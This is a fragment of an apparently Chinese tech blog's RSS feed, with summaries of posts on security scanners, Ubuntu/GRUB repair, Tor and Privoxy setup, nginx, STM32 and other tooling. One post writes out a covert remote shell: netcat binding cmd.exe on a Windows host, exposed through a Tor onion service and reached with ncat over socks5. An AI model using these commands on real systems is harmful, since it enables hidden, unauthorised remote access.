+      <description>转载的转载&#xA;https://blog.csdn.net/hackerie/article/details/77885818#comments&#xA;=========================================== 首先，谢谢原作者： （此文为转载的文章，现将原地址贴出如下：http://blog.csdn.net/mypc2010/article/details/77679760） https://github.com/Canbing007/wukong-agent http://www.freebuf.com/sectool/135151.html&#xA;python redis awvs api nessus api&#xA;=========================================== https://github.com/boy-hack/bugscan w8ay专属扫描器&#xA;===========================================&#xA;https://github.com/MXi4oyu/DockerXScan DockerXScan——Docker镜像漏洞扫描器&#xA;===========================================&#xA;https://github.com/netxfly/passive_scan&#xA;分布式 基于代理的web扫描器&#xA;=========================================== https://github.com/boy-hack/w8scan&#xA;===========================================&#xA;https://github.com/blackye/BkScanner BkScanner 分布式、插件化web漏洞扫描器&#xA;=========================================== https://github.com/sowish/LNScan 企业内网扫描器&#xA;=========================================== https://github.com/lietdai/doom&#xA;DOOM_SEC是在thorn上实现的分布式任务分发的ip端口漏洞扫描器 https://github.com/MiniSafe/microscan&#xA;仿bugsan https://github.com/LoRexxar/BScanner&#xA;目录扫描器 https://github.com/az0ne/AZScanner 自动漏洞扫描器，自动子域名爆破，自动爬取注入，调用sqlmapapi检测注入，端口扫描，目录爆破，子网段服务探测及其端口扫描，&#xA;常用框架漏洞检测。&#xA;=========================================== https://github.com/hxp2k6/smart7ec-scan-console 基于linux c 开发的WEB扫描与系统扫描集合一身的扫描工具，它能利用lua和python插件进行快速的插件扩展，最大程度的提高漏洞扫&#xA;描的综合能力。&#xA;Web层面扫描 系统服务层面扫描 基线配置的安全扫描&#xA;集成插件扫描 https://github.com/youmengxuefei/web_vul_scan 基于爬虫的web漏洞扫描器&#xA;=========================================== https://github.com/netxfly/Transparent-Proxy-Scanner 基于vpn和透明代理的web漏洞扫描器的实现思路及demo&#xA;=========================================== https://github.com/Rockyzsu/scan_host 多线程端口扫描器&#xA;http://30daydo.com/article/9 https://github.com/tengzhangchao/MaskScan&#xA;基于python实现的简单漏扫框架 https://github.com/ym2011/ScanBackdoor&#xA;Webshell扫描工具，通过各种规则和算法实现服务器脚本后门查杀 https://github.com/msandroid/PortScanner&#xA;C#端口扫描 https://github.com/Cnlouds/w3a_Scan_Console&#xA;基于Python的Web扫描器(用于W3A-Scan)Console版本的接口 https://github.</description>
+    </item>
+    <item>
+      <title>惠普Z840工作站使用U盘安装ubuntu16.04以及grub无法引导问题总结（干货）</title>
+      <link>https://anwangtanmi.github.io/posts/14d75d0c4802a26dc259ee35354321b1/</link>
+      <pubDate>Mon, 17 Sep 2018 22:03:31 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/14d75d0c4802a26dc259ee35354321b1/</guid>
+      <description>一、制作U盘启动盘&#xA;具体过程可参考该博客：https://blog.csdn.net/yaoyut/article/details/78003061&#xA;从Ubuntu官网http://cn.ubuntu.com/download/下载你需要安装的系统的iso文件 （用来制作的U盘需要是FAT32格式的，可以通过格式化U盘更改） 通过UltraISO来进行启动盘的制作 二、利用U盘启动盘安装ubuntu16.04&#xA;（1）bios设置：&#xA;1.插上制作好的启动盘，开机，进入logo界面按Esc进入Startup Menu，选择BIOS Setup：&#xA;2.在BIOS Setup里面选择Advanced，再进入Boot Options：&#xA;3.如图禁用UEFI模式，使用传统的Legacy模式（注意此处要把USB调整到第一项）：&#xA;4.完成设置回到Main选项，Save Changes and Exit，选择yes保存更改，就进入了U盘启动安装界面。&#xA;（2）安装ubuntu16.04&#xA;1.选择中文版或者英文版都行，为了方便以后google，建议英文版：&#xA;2.这一步都不用选，无需下载更新，不然会影响安装的速度：&#xA;3.选择”Something else”，方便我们自己分区，自定义安装的磁盘属性、大小等：&#xA;4.分区：由于惠普Z840是256G的固态+2T的机械，所以考虑运行速度（特别是做深度学习），将Swap、/boot、/三个分区都放在固态里面，机械就只放/home分区。我的分区具体如下，可做参考：&#xA;Swap：64G（考虑Z840内存为32G，所以两倍完全够用），分区类型选择logical；&#xA;/boot：1G（这是系统引导分区，一般的500M完全够，我用1G是为了看起来舒服），分区类型primary；&#xA;/：191G（这相当于Windows的C盘，大点肯定没问题），分区类型primar；&#xA;/home:2T（用来存放个人文档、软件包等等），分区类型logical。&#xA;（注意：最下面的Device for boot loader installation我们要选择我们刚刚分区的时候/boot的磁盘好，我的是sda2，这是为了每次启动的时候引导启动ubuntu系统，非常重要！！！）&#xA;等待安装……………..完成，重启电脑&#xA;三、无法引导ubuntu启动问题&#xA;这是本文章的重点，我也是在上面踩了好久，来来回回装了几十遍系统，终于摸到点底~&#xA;重启过后我们会发现系统报错，直接进入了grub rescue自救界面，首先说一下产生的原因：&#xA;引起这类问题的原因有很多，比如在windows系统中删除linux系统或者是直接格式化linux盘（我之前就是这么做的，因为方便快捷，结果导致这个问题，坠入了这个深坑），linux系统到启动分区被更改了……总之就是grub配置文件已经被损坏，导致不能正常启动，而进入了救援模式。&#xA;主要分为一下几个步骤：&#xA;1. 利用 ls 命令列出磁盘信息：&#xA;grub rescue&amp;gt; ls 比如说，结果为：&#xA;(hd0,msods1),(hd0,msdos2),(hd0,msdos3),(hd1,msdos2),…..&#xA;继续利用 ls 命令来查找 ubuntu 分区：这里需要注意区分在安装ubuntu时是否单独分了/boot分区（因为有些博客里面说不用给/boot分区可解决这个问题，但是我尝试了好像不能解决我的这个问题，所以找了其他的资料，进行尝试）&#xA;grub rescue&amp;gt; ls (hd0,msdos1)/boot/grub # 未单独分出/boot分区 grub rescue&amp;gt; ls (hd0,msdos1)/grub # 单独进行啦/boot分区 针对以上所示到磁盘分区逐个调用上述命令，直到结果显示没有错误，而是列出一系列文件为止。我的是 ls (hd0,msdos3)/grub 到时候列出了一些文件，说明找到了ubuntu分区。</description>
+    </item>
+    <item>
+      <title>centos取消休眠失误导致进不了图形界面解决方法</title>
+      <link>https://anwangtanmi.github.io/posts/971da5bb0de4f3cfa9ee20985e2e07ec/</link>
+      <pubDate>Fri, 14 Sep 2018 15:23:51 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/971da5bb0de4f3cfa9ee20985e2e07ec/</guid>
+      <description> 我的centos只要一暗屏，就开不了机，所以我就不想让屏幕变暗，以前是通过设置自动挂起的时间来解决的，但最长也就到两小时，如果还没有操作进行，屏幕就灭了，然后只能强关重启电脑。但我就是想要它一直亮着，任何时间都能进行操作。 所以我就在网上找方法找到了一个方法，修改xorg.conf这个文件内容，网上的这一方法可能就是针对他们的电脑适用吧。我改后就卡在开机那块了，差点吓死人，经营了这么久的系统就这样完了。 并不是,我们改的是显示器和显卡的配置，我们只是进不了图形界面，所以在开机后，直接按ctrl+shift+1~6进字符界面把你改的配置文件改回来就行了。 </description>
+    </item>
+    <item>
+      <title>Tor的使用和配置</title>
+      <link>https://anwangtanmi.github.io/posts/a4fdd187a2fb77b2481df5ca180fb3db/</link>
+      <pubDate>Sat, 25 Aug 2018 23:50:18 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/a4fdd187a2fb77b2481df5ca180fb3db/</guid>
+      <description>文章目录 1、Tor是什么？ 2、安装Tor 3、配置Tor 4、Chrome中`SwitchySharp`的配置 5、Python来测试ip 1、Tor是什么？ Tor（The Onion Router，洋葱路由器）是实现匿名通信的自由软件。Tor是第二代洋葱路由的一种实现，用户通过Tor可以在因特网上进行匿名交流。&#xA;而对于爬虫爱好者来说，Tor会隐藏你的真实ip地址，导致被爬网站的网管无法封掉你的ip（当然是在对方觉得精确定位你的ip无价值的情况下）安全是相对的，匿名也是相对的。&#xA;2、安装Tor tor分为浏览器版本和命令行版本。前者针对普通用户来使用，使用的是【改造办的火狐浏览器】，下载后就可以使用。&#xA;而命令行版的就是在电脑或者服务器的开一个服务，监听默认的9050端口。&#xA;1.图形界面版下载地址&#xA;2.命令行版brew install tor&#xA;3、配置Tor 在下面路径/usr/local/etc/tor找到文件torrc.sample，拷贝一份命名为torrc。&#xA;常用配置的参数&#xA;参数 作用 Socks5Proxy 前置 Socks 代理端口 HTTPProxy 前置 HTTP 代理端口 HTTPSProxy 前置 HTTPS 代理端口 SocksProt 外部程序访问 Tor 的端口 MaxCircuitDirtiness 自动切换 ip 的时间间隔 我的配置&#xA;CookieAuthentication 1 # shadowsocks 客户端提供的 HTTP 代理地址为 127.0.0.1:1087 #HTTPProxy 127.0.0.1:1087 #HTTPSProxy 127.0.0.1:1087 Socks5Proxy 127.0.0.1:1086 # 外部程序Tor 的端口 SocksPort 9050 MaxCircuitDirtiness 10 seconds 直接在命令面板执行tor命令输出。注意：不配置shadowsocks的代理地址不会连接成功。&#xA;➜ tor tor Aug 25 23:41:30.</description>
+    </item>
+    <item>
+      <title>mac os 安装 Tor 命令行监视器 nyx</title>
+      <link>https://anwangtanmi.github.io/posts/39542ed2dde5f0e861d23c9473be781a/</link>
+      <pubDate>Thu, 02 Aug 2018 16:06:03 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/39542ed2dde5f0e861d23c9473be781a/</guid>
+      <description>Nyx是Tor的命令行监视器&#xA;安装 nyx brew install nyx 查看nyx版本 nyx --version nyx version 2.0.4 (released November 5, 2017)&#xA;运行报错 nyx Unable to connect to tor. Are you sure it&#39;s running?&#xA;参考: 1.Nyx是Tor的命令行监视器</description>
+    </item>
+    <item>
+      <title>Tor 网桥获取 deep web</title>
+      <link>https://anwangtanmi.github.io/posts/67bd02948c5684d8080e6aa59eb8335c/</link>
+      <pubDate>Thu, 02 Aug 2018 15:19:36 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/67bd02948c5684d8080e6aa59eb8335c/</guid>
+      <description>[ 访问网桥帮助文档]（https://tb-manual.torproject.org/en-US/bridges.html ） – [ 在线获取]（https://bridges.torproject.org/ ） -通过Gmail发送电子至邮件 [email protected]的&#xA;参考：&#xA;1.Deep Web&#xA;2.暗网导航</description>
+    </item>
+    <item>
+      <title>CentOS&#43;tor&#43;Privoxy 服务搭建 &#43; Ubuntu &#43; tor&#43;Privoxy服务搭建 &#43; 匿名网站搭建</title>
+      <link>https://anwangtanmi.github.io/posts/b30e6bf3945e85e1895e04acb4033321/</link>
+      <pubDate>Wed, 01 Aug 2018 20:33:54 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/b30e6bf3945e85e1895e04acb4033321/</guid>
+      <description>CentOS+tor+Privoxy 服务搭建(要出墙tor才可正常使用）：&#xA;sudo yum install epel-release 不然没有源&#xA;sudo yum install tor&#xA;service tor start 启动服务 检查服务状态 service tor status&#xA;sudo yum install privoxy 安装&#xA;要修改一下privoxy 配置文件 将tor 和privoxy整合&#xA;vi /ect/privoxy/config 搜索/forward-socks5t 找到注释拿掉 ESC wq保存退出&#xA;启动privoxy service privoxy start 启动完成检查状态 status 这样就完成了服务搭建 设置完成代理 检查是否成功 访问https://check.torproject.org/ 验证&#xA;Ubuntu + tor + Privoxy 服务搭建：&#xA;ubuntu相对来说就好点了 配置好可靠的源 update sudo apt-get install tor&#xA;service tor start 检查服务 status&#xA;sudo apt-get install privoxy&#xA;同样修改配置 vi /ect/privoxy/config 搜索/forward-socks5t 找到注释拿掉 ESC wq保存退出</description>
+    </item>
+    <item>
+      <title>看我如何通过Tor Onion在Windows中执行远程Shell</title>
+      <link>https://anwangtanmi.github.io/posts/99b38b7816aa9155b620a3d4f8c87add/</link>
+      <pubDate>Mon, 26 Feb 2018 16:24:13 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/99b38b7816aa9155b620a3d4f8c87add/</guid>
+      <description>在这篇文章中，我将跟大家分享我的一个小发现，即如何在Windows平台中通过Tor Onion服务来开启远程Shell 。接下来，话不多说，我们直奔主题。 操作方法 首先，我们要在一个Windows Tor客户端中创建一个Tor onion服务（即隐藏服务）。我下载了Tor Expert bundle（同样适用于Tor浏览器）-【下载地址】。&#xA;然后使用下列命令创建Tor配置文件torrc：&#xA;HiddenServiceDir C:\demo\Tor\service HiddenServicePort 8662 127.0.0.1:12345 开启Tor服务之后，将会自动创建目录C:\demo\Tor\Service，并填充一系列必要的文件（&amp;lt;主机名&amp;gt;文件夹包含了这个Toronion服务的.onion地址）。&#xA;该onion服务将监听端口8662，而流量将会直接转发到127.0.0.1（端口12345）。&#xA;这里我们还可以给服务开启客户端验证功能，因为如果不开启这个功能的话，任何知道这个.onion地址和端口号的人都可以进行连接。最基础的客户端验证使用了共享密钥，你可以使用下列命令进行配置（torrc）：&#xA;HiddenServiceAuthorizeClient basic testuser 这里我选择使用testuser作为客户端名称：&#xA;接下来，我们可以使用配置文件torrc来开启Tor：&#xA;tor.exe -f torrc .onion地址以及客户端验证cookie可以在service目录的&amp;lt;主机名&amp;gt;文件夹中找到：&#xA;nybjuivgocveiyeq.onion Wa5kOshPqZF4tFynr4ug1g # client: testuser 当然了，你一定要保护认证cookie密钥的安全。&#xA;现在，用nc.exe在目标Windows设备上开启服务（我几年前就在电脑上下载了nc.exe，我不记得原始的URL地址了，我使用的版本是v1.11，MD5为ab41b1e2db77cebd9e2779110ee3915d）：&#xA;nc -e cmd.exe -L -s 127.0.0.1 -p 12345 Tor ExpertBundle以及nc.exe不需要任何其他的依赖组件（跟DLL类似），因此任意用户都可以直接运行。&#xA;现在我们的目标主机已经配置好了，在另一台设备上，我需要使用包含了认证cookie的配置文件来开启Tor服务：&#xA;HidServAuth nybjuivgocveiyeq.onion Wa5kOshPqZF4tFynr4ug1g 接下来，我们需要运行ncat，因为ncat.exe支持socks5代理（nc.exe不支持）：&#xA;ncat.exe --proxy 127.0.0.1:9050 --proxy-type socks5 nybjuivgocveiyeq.onion 8662 接下来，我们就得到远程Shell啦！&#xA;提醒大家一下，这种方法不适用于ncat v 7.60版本，具体原因请参考【这里】：&#xA;ibnsock select_loop(): nsock_loop error 10038: An operation was attempted on somethingthat is not a socket.</description>
+    </item>
+    <item>
+      <title>centos7 离线配置安装nginx</title>
+      <link>https://anwangtanmi.github.io/posts/1872d73ee4c1c8c6e022d0338730edf6/</link>
+      <pubDate>Thu, 21 Dec 2017 13:40:29 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/1872d73ee4c1c8c6e022d0338730edf6/</guid>
+      <description>下载nginx包 tar -zxvf nginx-1.13.7.tar.gz&#xA;cd nginx-1.13.7&#xA;安装 ./configure&#xA;make clean ####清除./configure时产生的临时文件&#xA;可能会报错误 ### the HTTP rewrite module requires the PCRE library. ###显示需要pcre&#xA;rpm -ivh pcre pcre-devle zlib zlib-devle&#xA;./configure&#xA;执行完成会看到&#xA;###&#xA;Configuration summary&#xA;+ using system PCRE library&#xA;+ OpenSSL library is not used&#xA;+ using system zlib library&#xA;nginx path prefix: “/usr/local/nginx”&#xA;nginx binary file: “/usr/local/nginx/sbin/nginx”&#xA;nginx modules path: “/usr/local/nginx/modules”&#xA;nginx configuration prefix: “/usr/local/nginx/conf”&#xA;nginx configuration file: “/usr/local/nginx/conf/nginx.conf”</description>
+    </item>
+    <item>
+      <title>STM32官方固件库代码解读–GPIO</title>
+      <link>https://anwangtanmi.github.io/posts/1249d2d78c0c59fa7fe4d58ad1c395dc/</link>
+      <pubDate>Sun, 15 Oct 2017 22:05:51 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/1249d2d78c0c59fa7fe4d58ad1c395dc/</guid>
+      <description>最近闲得无聊，又把 stm32 拿了出来。之前学的时候是看的库函数版本，现在和寄存器版本的一起看感觉比一开始接触的时候看得顺畅多了，详细了解了底层寄存器的功能。之前用 stm32 只是调用函数，看了寄存器版本后对那些实现具体细节的库函数代码产生了兴趣，所以稍微看了看库函数的代码，同时把一些难理解的地方也记录下来。&#xA;我用的是 ALIENTEK 的战舰版，看的也是他们的开发指南，这里我就写对库函数代码的理解，寄存器种类和功能等指南里面有的我基本不写了。&#xA;一开始是 GPIO，学任何单片机一开始都是流水灯。stm32 的每组 GPIO 有 7 个寄存器，功能这里就不介绍了，网上很多。官方库里关于 GPIO 有 18 个函数，看了几个常用的，如下&#xA;void GPIO_Init(GPIO_TypeDef* GPIOx, GPIO_InitTypeDef* GPIO_InitStruct); uint8_t GPIO_ReadInputDataBit(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin); uint16_t GPIO_ReadInputData(GPIO_TypeDef* GPIOx); uint8_t GPIO_ReadOutputDataBit(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin); uint16_t GPIO_ReadOutputData(GPIO_TypeDef* GPIOx); void GPIO_SetBits(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin); void GPIO_ResetBits(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin); void GPIO_WriteBit(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, BitAction BitVal); void GPIO_Write(GPIO_TypeDef* GPIOx, uint16_t PortVal); 这些函数除了第一个初始化函数以外其他都很简单，了解一下寄存器的功能就能看明白代码了，这里只写一下初始化函数。 代码如下：&#xA;void GPIO_Init(GPIO_TypeDef* GPIOx, GPIO_InitTypeDef* GPIO_InitStruct) { uint32_t currentmode = 0x00, currentpin = 0x00, pinpos = 0x00, pos = 0x00; uint32_t tmpreg = 0x00, pinmask = 0x00; /* Check the parameters */ assert_param(IS_GPIO_ALL_PERIPH(GPIOx)); assert_param(IS_GPIO_MODE(GPIO_InitStruct-&amp;gt;GPIO_Mode)); assert_param(IS_GPIO_PIN(GPIO_InitStruct-&amp;gt;GPIO_Pin)); /*---------------------------- GPIO Mode Configuration -----------------------*/ currentmode = ((uint32_t)GPIO_InitStruct-&amp;gt;GPIO_Mode) &amp;amp; ((uint32_t)0x0F); if ((((uint32_t)GPIO_InitStruct-&amp;gt;GPIO_Mode) &amp;amp; ((uint32_t)0x10)) !</description>
+    </item>
+    <item>
+      <title>kali安装tor</title>
+      <link>https://anwangtanmi.github.io/posts/30d0e000c2519d3e6277def51782ae2b/</link>
+      <pubDate>Wed, 16 Aug 2017 11:17:05 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/30d0e000c2519d3e6277def51782ae2b/</guid>
+      <description>﻿﻿ http://www.blackmoreops.com/2013/12/16 /installing-tor-kali-linux/&#xA;Home Kali Linux Hacking How to Virtual Private Network (VPN) Popular Categories AMD Command Line Interface (CLI) Denial-of-Service Attack (DoS) Desktop Managers Security Linux Linux Administration News NVIDIA VirtualBox Wireless LAN (Wi-Fi) Contact Us Disclaimer Privacy Policy Wednesday , August 16 2017 Home Kali Linux Hacking How to Virtual Private Network (VPN) Popular Categories AMD Command Line Interface (CLI) Denial-of-Service Attack (DoS) Desktop Managers Security Linux Linux Administration News NVIDIA VirtualBox Wireless LAN (Wi-Fi) Contact Us Disclaimer Privacy Policy blackMORE Ops Learn one trick a day ….</description>
+    </item>
+    <item>
+      <title>强密码和弱密码并没有什么区别？NIST密码安全标准更新：不再建议密码要求混合大写字母、字符和数字</title>
+      <link>https://anwangtanmi.github.io/posts/04e24c5ac7d676f4c5ac9f49fc5c9257/</link>
+      <pubDate>Tue, 15 Aug 2017 13:35:43 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/04e24c5ac7d676f4c5ac9f49fc5c9257/</guid>
+      <description>作为一名认真负责的小编，每次注册账号设置密码的时候都是最痛苦的，太简单的怕被破解，太难的又记不住。&#xA;等你好不容易记住密码，三个月后IT同学过来拍拍你的肩膀，“你的密码到期了，记得改啊……”&#xA;目前绝大部分网站对于注册账号的密码强度分为3个等级：弱密码、中密码、强密码。网站会引导用户填写密码的时候混合大写字母、字符和数字的强密码。&#xA;但这种密码设置要求来源于美国国家标准和技术协会（NIST）。当年NIST主管Bill Burr撰写了一份名为NIST Special Publication 800-63的文档，建议大家设置密码时混合大写字母、字符和数字，并定期修改。这么成（keng）熟（die）的建议后来被各大媒体广为传播，一时传为美谈。&#xA;紧接着国内外网站纷纷响应，吃瓜群众创造了各种各样的花式密码。 单词间隔法：Pa55word!1 古诗转化法：Heartulx1.tong（心有灵犀一点通）&#xA;化学方程式：CH4+2O2=CO2+2H2O 键盘顺序法：1qaz@WSX ……&#xA;但在今年6月，原作者后悔了……美国国家标准和技术协会（NIST）提供的最新数字身份指南的新版草案中，不再推荐用户使用这一标准，因为研究显示此类标准，并没有什么卵用…… 比如形似“Tr0ub4dor&amp;amp;3”这样的密码只需要用标准的破解技术在三天之内就能够破解，而且你很容易在被破解之前就忘掉自己的密码。而一句完全采用英文单词组成的摸不着头脑的短语 “correct horse battery staple”却需要约550年来破解。（如来佛祖的五指山都压不住啦）&#xA;而这组词语很容易形成独特的画面，对于人类来说非常容易形成记忆，但对计算机来说堪比天书，使得它很难被破解。 图片来自网络&#xA;另外研究显示，频繁的更改密码没有预想的效果，达不到保护密码安全的目的。因为大多数人应对 90 天更改密码要求采取的做法是将现有密码略微修改一下，比如 Pa55word!1 改为 Pa55word!2，完全起不到保护作用，很容易被猜出。 NIST数字身份指南的新版草案作者 Paul Grassi指出，此前的密码安全建议都是在摸索中前进，没有前人的尝试也无法摸索出切实有效的密码建议。所以也不再建议大家密码要求混合大写字母、字符和数字。他认为最重要的是储存的密码必须盐化哈希 MAC 处理。&#xA;密码的复杂性对于个人用户来说很重要，但对于提供登录场景的互联网企业来说，风险防控更加重要，它是保护用户账号安全的最后一道防火墙。&#xA;即便在用户无意间泄露密码，或密码设置过于简单的情况下，企业能基于用户行为、软硬件环境信息、业务基础信息综合判定用户登录请求的风险程度，避免机器人撞库或者非本人登录。阿里聚安全提供的数据风控功能，能有效对登录场景进行防控，防止刷库撞库、暴力破解、可疑登录等。并提供滑动验证码服务，通过生物特征判定操作计算机的是人还是机器，从而取代传统验证方式。&#xA;阿里聚安全 – 数据风控&#xA;阿里聚安全的数据风控功能，目前免费试用，欢迎来体验测试！&#xA;免费体验地址：http://jaq.alibaba.com/riskcontrol&#xA;————&#xA;更多安全热点资讯和知识分享，请关注阿里聚安全的官方博客</description>
+    </item>
+    <item>
+      <title>墨刀使用总结</title>
+      <link>https://anwangtanmi.github.io/posts/d6a455dcf9a4aa9f200d283020373399/</link>
+      <pubDate>Sun, 11 Jun 2017 14:23:28 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/d6a455dcf9a4aa9f200d283020373399/</guid>
+      <description> 使用墨刀进行原型设计总结 墨刀是一个原型设计软件，在本次系统分析课程的电影售票应用泡影APP的原型设计中我们使用了它。虽然可能功能没有那么完整，但已经基本够用。目前墨刀分为网页版和客户端，网页版可以直接使用，客户端在网页版的功能的基础上增加了诸如可以随时提取页面中某一颜色然后应用于对应控件等小功能。&#xA;下面我们以网页版墨刀为例来进行使用总结： 一、创建新的应用 访问墨刀官网，登录之后会看到如下的页面： 点击右上方的创建应用，可以选择不同的模板和设备类型，填写应用名称之后即可完成应用的创建，比方说上图的泡影就是我创建的一个应用，然后我们可以随时编辑应用或者与他人共同编辑和分享应用。 二、编辑应用 点击我们创建的对应应用进行编辑，进去之后会看到下图，其分为菜单栏、组件栏、编辑栏和预览排列栏几个部分。最左边是组件栏，我们可以在这里选择需要的组件，然后拖拽到中间编辑栏中进行设计；中间编辑栏里可以对选取的组件进行编辑；右边是预览排列，就是最终我们看到的页面的基本排列。&#xA;1、组件使用 如图，我们把左边组件栏中的一些组件拉到这个中间的编辑栏，通过双击对应的组件进行文字或者颜色的编辑：&#xA;2、页面管理 对于页面的管理，我们可以在最右边的页面管理栏进行新建或者复制页面，这样我们的原型也可以在不同页面之间跳转，如下图所示是一个原型部分页面树图： 3、页面跳转 如果要进行页面之间的跳转，可以点击组件，然后拉动组件旁边的超链接的样式图标到相应页面即可执行进行页面跳转功能，如下图所示：&#xA;三、导出下载图片或者安装包 点击页面上方的下载图标，具体如下图所示： 四、运行分享应用 点击页面上方的运行图标即可运行编辑的应用，而后在运行页面右方通过分享图标可以生成分享链接，如下图所示： </description>
+    </item>
+    <item>
+      <title>sublime配置及使用技巧</title>
+      <link>https://anwangtanmi.github.io/posts/166981be902e20703f2fc926a78cf899/</link>
+      <pubDate>Thu, 05 Jan 2017 20:45:14 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/166981be902e20703f2fc926a78cf899/</guid>
+      <description>如果需要 vim 配置，可以移步 面向 web 前端及 node 开发人员的 vim 配置&#xA;sublime 3 配置和使用技巧 第一步，设置settings 一下是我个人喜欢的格式配置，在perferences -&amp;gt; settings&#xA;{ &#34;color_scheme&#34;: &#34;Packages/User/SublimeLinter/MarkdownEditor-Dark (SL).tmTheme&#34;, //颜色风格 &#34;font_size&#34;: 16, //字体大小 &#34;indent_using_spaces&#34;: true, //使用空格缩进 &#34;tab_size&#34;: 2, //一次缩进2个空格 &#34;translate_tabs_to_spaces&#34;: true, //tab自动转化为空格 &#34;trim_trailing_white_space_on_save&#34;: true, //保存时去除尾部多余空格 &#34;expand_tabs_on_save&#34;: true, //保存时重写tab设置 &#34;shift_tab_unindent&#34;: true, //使 shift+tab 等效为 command+{快捷键 &#34;spell_check&#34;: true, //开启拼写检查 &#34;line_numbers&#34;: true, //显示行号 &#34;folder_exclude_patterns&#34;: [&#34;.svn&#34;, &#34;.git&#34;, &#34;.hg&#34;, &#34;CVS&#34;, &#34;node_modules&#34;], //忽略查找元素 &#34;ignored_packages&#34;: [&#34;Vintage&#34;], //忽略使用的插件 &#34;ensure_newline_at_eof_on_save&#34;: true, //确保文件结尾有一个空行 &#34;save_on_focus_lost&#34;: true, //失去焦点时储存 &#34;atmic_save&#34;: true //自动存储 } 关于expand_tabs_on_save，我们需要额外添加python代码，方法如下： 1.</description>
+    </item>
+    <item>
+      <title>联想 昭阳 E41-80 i7-6500U 安装 win7 方法说明</title>
+      <link>https://anwangtanmi.github.io/posts/c22f0c186f6fc5cfe6064ff6f3ecce74/</link>
+      <pubDate>Fri, 29 Jul 2016 22:50:52 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/c22f0c186f6fc5cfe6064ff6f3ecce74/</guid>
+      <description>i7-6500U 属于 Intel 第六代 CPU ， 核心架构采用 Skylake&#xA;平台使用了XHCI主控代替了以前的EHCI主控，win7安装盘里却没有这个驱动，所以除非你用光盘安装系统，如果你用U盘安装，还没开始装，USB本身就已经失效了。&#xA;那么既然你可以用光盘装，好吧，我把你虚拟挂载在光盘目录下，不就解决这个问题了嘛。&#xA;下载老毛桃 UEFI 系统镜像 http://www.laomaotao.net/&#xA;烧录老毛桃 UEFI U盘启动盘 http://www.laomaotao.org/jiaocheng/UEFIbqdzz.html&#xA;拷贝 WIN7 官方系统镜像 ISO 文件 到 U 盘 http://www.wingod8.com/a/yuanbanxitong/win7/463.html&#xA;下载并安装光盘挂载软件 OSFMount 并将解压出来的软件整体拷贝到 U 盘中 http://www.osforensics.com/tools/mount-disk-images.html&#xA;插上 U 盘 启动电脑 在 LENOVO 界面按 F2 进入 BIOS 设置 BOOT –&amp;gt; “Legacy Support” “UEFI First”&#xA;重启后选择 “Win8PE系统” 使用 OSFMount 挂载 ISO 光盘镜像 打开我的电脑 双击CD/DVD 安装即可 http://www.arpun.com/article/7124.html&#xA;==========================================================================&#xA;后来在网上看到了这样一篇文章，发出链接和大家共勉了！！！&#xA;手把手教你制作一个可以在skylake上安装win7的U盘 http://www.51nb.com/xinwen/benzhanshiye/2015-10-05/70380.html</description>
+    </item>
+    <item>
+      <title>CentOS 必知命令 &amp; Composer部署</title>
+      <link>https://anwangtanmi.github.io/posts/22281640700a19e8db121c3a1220bccb/</link>
+      <pubDate>Fri, 17 Jun 2016 16:27:36 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/22281640700a19e8db121c3a1220bccb/</guid>
+      <description>#查看文件&#xA;ll -a 查看文件详细信息，包括隐藏文件&#xA;ls -a 查看文件简略信息&#xA;#删除文件&#xA;rm -r /home/test （删除目录以及目录下所有文件）&#xA;rm -r -f /home/test （不做提示）&#xA;#移动文件&#xA;mv -r /home/test /udisk/bak（移动目录以及目录下所有文件到其他地方）&#xA;#复制文件&#xA;cp -r /home/test /udisk/bak（复制目录以及目录下所有文件到其他地方）&#xA;wget -c –limit-rate=300k （断点限速下载）&#xA;#批量修改权限&#xA;chown -R www * 批量修改目录下所有文件，用户为www&#xA;chown -R :www * 批量修改目录下所有文件，用户组为www&#xA;chown -R www.group * 批量修改目录下所有文件，用户为www，用户组为group&#xA;chmod -R 555 * 批量修改目录下所有文件，读写权限为555&#xA;#Azure修改root密码&#xA;sudo passwd root&#xA;#vi命令&#xA;:wq 保存并退出&#xA;:q 仅退出&#xA;i 插入&#xA;更多&#xA;#解压缩&#xA;zip -re filename.zip filename 回车，输入2次密码</description>
+    </item>
+    <item>
+      <title>去掉局域网共享文件夹下的“小手\” 图标</title>
+      <link>https://anwangtanmi.github.io/posts/6ac80b0e9991c4ff97d1f25446796b04/</link>
+      <pubDate>Wed, 28 Oct 2015 16:52:18 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/6ac80b0e9991c4ff97d1f25446796b04/</guid>
+      <description> 组建局域网之后，看到共享文件夹下的“小手”觉得很不习惯，而且有时候不想让别人看到文件夹被共享，可以修改注册表去掉这个小手&#xA;运行“regedit”，打开[HKEY_CLASSES_ROOT\NETWORK\SHARINGHANDLER]，它的默认键值是“ntshrui.dll”,清空此键值，退出注册表，重启(或重新加载explorer.exe）后生效。 </description>
+    </item>
+    <item>
+      <title>虚拟机linux环境下安装weblogic，创建域，配置数据源和部署环境</title>
+      <link>https://anwangtanmi.github.io/posts/9612e689d99314ca0dc172bd732f0585/</link>
+      <pubDate>Sat, 31 Mar 2012 11:54:44 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/9612e689d99314ca0dc172bd732f0585/</guid>
